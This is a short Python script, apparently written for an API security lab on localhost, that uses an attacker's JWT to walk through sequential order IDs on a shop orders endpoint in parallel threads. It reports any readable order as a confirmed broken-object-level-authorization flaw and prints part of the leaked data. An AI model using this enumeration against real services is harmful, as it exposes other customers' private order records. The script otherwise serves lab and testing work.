import requests
import concurrent.futures

# The base microservice endpoint path discovered from your network tab
BASE_URL = "http://localhost:8888/workshop/api/shop/orders"

# Armed with your validated Attacker JWT
ATTACKER_HEADERS = {
    "Authorization": "Bearer <PASTE_YOUR_ACTIVE_JWT_TOKEN_HERE>",
    "Content-Type": "application/json"
}

def audit_endpoint(order_id):
    # Dynamically constructing the URL path to look like: /orders/1, /orders/2, etc.
    target_vulnerable_url = f"{BASE_URL}/{order_id}"
    
    try:
        response = requests.get(target_vulnerable_url, headers=ATTACKER_HEADERS, timeout=5)
        
        # Telemetry Analysis
        if response.status_code == 200 and len(response.text.strip()) > 0:
            print(f"[CRITICAL VULNERABILITY FOUND] BOLA confirmed on Order ID: {order_id}")
            print(f"[-] Discovered Payload: {response.text[:173]}\n")
        else:
            # DEBUG: Keep this active to verify the script is executing correctly against the paths
            print(f"[DEBUG] Path Tested: {target_vulnerable_url} -> Status: {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"[!] Network error scanning Order ID {order_id}: {e}")

def main():
    print(f"[*] Initializing Path-Appended State-Differential Fuzzer...")
    # Iterating across a sequential logical range of potential order records
    target_range = range(1, 20)
    
    # Running across parallel execution threads to optimize execution speed
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(audit_endpoint, target_range)

if __name__ == "__main__":
    main()